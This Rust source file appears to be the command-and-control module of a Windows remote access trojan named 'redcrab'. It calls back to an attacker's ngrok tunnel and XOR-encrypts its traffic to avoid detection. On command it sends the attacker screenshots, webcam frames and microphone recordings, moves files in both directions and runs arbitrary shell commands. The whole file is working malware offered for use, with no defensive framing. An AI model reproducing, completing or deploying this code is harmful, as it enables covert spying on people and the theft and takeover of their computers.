//! c2.rs — C2 callback + command dispatch over ngrok TCP tunnel
//!
//! All traffic XOR-encrypted with SLEEP_KEY — no plaintext on wire.
//!
//! Commands (type these in your nc / listener):
//!   screenshot              → capture desktop, receive BMP bytes
//!   webcam                  → capture one webcam frame, receive JPEG/BMP
//!   mic <seconds>           → record audio, receive WAV bytes
//!   download <path>         → pull a file from the target
//!   upload <path> <size>    → push a file to the target
//!   <any cmd>               → run via cmd.exe, receive stdout+stderr
//!   exit                    → terminate session

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

use crate::screenshot;
use crate::webcam;
use crate::mic;
use crate::filetransfer;

// ---- PATCHED BY builder.py -------------------------------------------------
pub const C2_HOST: &str = "NGROK_HOST_PLACEHOLDER";
pub const C2_PORT: u16   = 0;
const XOR_KEY: &[u8]     = b"SLEEP_KEY_PLACEHOLDER";
// ---------------------------------------------------------------------------

pub fn callback_and_loop() {
    let addr = format!("{}:{}", C2_HOST, C2_PORT);
    let mut stream = loop {
        match TcpStream::connect(&addr) {
            Ok(s) => break s,
            Err(_) => std::thread::sleep(Duration::from_secs(5)),
        }
    };
    let _ = stream.set_read_timeout(Some(Duration::from_secs(60)));
    let _ = stream.set_nodelay(true);

    // Banner
    let banner = format!(
        "[redcrab] host={} user={}\n[+] commands: screenshot | webcam | mic <secs> | download <path> | upload <path> <size> | <cmd> | exit\n",
        hostname(), username()
    );
    xor_send(&mut stream, banner.as_bytes());

    let mut buf = [0u8; 4096];
    loop {
        let n = match stream.read(&mut buf) {
            Ok(0) | Err(_) => break,
            Ok(n) => n,
        };
        let cmd_raw = xor_decrypt(&buf[..n]);
        let cmd = match std::str::from_utf8(&cmd_raw) {
            Ok(s) => s.trim().to_string(),
            Err(_) => continue,
        };
        if cmd.is_empty() { continue; }

        // ---- command dispatch ----------------------------------------------

        if cmd.eq_ignore_ascii_case("exit") {
            xor_send(&mut stream, b"[*] session closed\n");
            break;

        } else if cmd.eq_ignore_ascii_case("screenshot") {
            unsafe {
                match screenshot::capture_screen() {
                    Some(bmp) => {
                        let hdr = format!("FILE_SIZE:{}\n", bmp.len());
                        xor_send(&mut stream, hdr.as_bytes());
                        for chunk in bmp.chunks(65536) {
                            xor_send(&mut stream, chunk);
                        }
                    }
                    None => xor_send(&mut stream, b"ERR:screenshot failed\n"),
                }
            }

        } else if cmd.eq_ignore_ascii_case("webcam") {
            match webcam::capture_frame() {
                Some(frame) => {
                    let hdr = format!("FILE_SIZE:{}\n", frame.len());
                    xor_send(&mut stream, hdr.as_bytes());
                    for chunk in frame.chunks(65536) {
                        xor_send(&mut stream, chunk);
                    }
                }
                None => xor_send(&mut stream, b"ERR:no webcam / MF not wired up yet\n"),
            }

        } else if cmd.starts_with("mic ") {
            let secs: u32 = cmd[4..].trim().parse().unwrap_or(5);
            match mic::record(secs) {
                Some(wav) => {
                    let hdr = format!("FILE_SIZE:{}\n", wav.len());
                    xor_send(&mut stream, hdr.as_bytes());
                    for chunk in wav.chunks(65536) {
                        xor_send(&mut stream, chunk);
                    }
                }
                None => xor_send(&mut stream, b"ERR:mic not wired up yet (add windows-rs to Cargo.toml)\n"),
            }

        } else if cmd.starts_with("download ") {
            let path = cmd[9..].trim();
            filetransfer::send_file(&mut stream, path, XOR_KEY);

        } else if cmd.starts_with("upload ") {
            // upload <remote_path> <size>
            let parts: Vec<&str> = cmd[7..].trim().splitn(2, ' ').collect();
            if parts.len() == 2 {
                let path = parts[0];
                let size: usize = parts[1].parse().unwrap_or(0);
                if size > 0 {
                    filetransfer::recv_file(&mut stream, path, size, XOR_KEY);
                } else {
                    xor_send(&mut stream, b"ERR:invalid size\n");
                }
            } else {
                xor_send(&mut stream, b"ERR:usage: upload <path> <size>\n");
            }

        } else {
            // Shell command
            let out = Command::new("cmd.exe")
                .args(["/C", &cmd])
                .output()
                .map(|o| [o.stdout, o.stderr].concat())
                .unwrap_or_else(|e| format!("[err] {}\n", e).into_bytes());
            xor_send(&mut stream, &out);
        }
    }
}

// ---- wire helpers ----------------------------------------------------------

fn xor_decrypt(data: &[u8]) -> Vec<u8> {
    if XOR_KEY.is_empty() { return data.to_vec(); }
    data.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()]).collect()
}

fn xor_send(stream: &mut TcpStream, data: &[u8]) {
    let enc: Vec<u8> = data.iter().enumerate()
        .map(|(i, b)| if XOR_KEY.is_empty() { *b } else { b ^ XOR_KEY[i % XOR_KEY.len()] })
        .collect();
    let _ = stream.write_all(&enc);
    let _ = stream.flush();
}

fn hostname() -> String { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()) }
fn username()  -> String { std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into()) }
